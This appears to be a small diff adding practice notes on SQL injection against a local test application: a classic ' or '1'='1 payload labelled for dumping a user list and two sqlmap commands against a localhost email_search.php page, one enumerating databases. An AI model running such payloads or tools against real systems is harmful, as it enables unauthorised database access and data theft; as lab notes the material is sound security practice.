@@ -1,0 +1,4 @@
+get user list------------ ' or '1'='1,
+
+sqlmap -u "http://127.0.0.1:9000/email_search.php?search=admin"
+sqlmap -u "http://127.0.0.1:9000/email_search.php?search=admin" --dbs
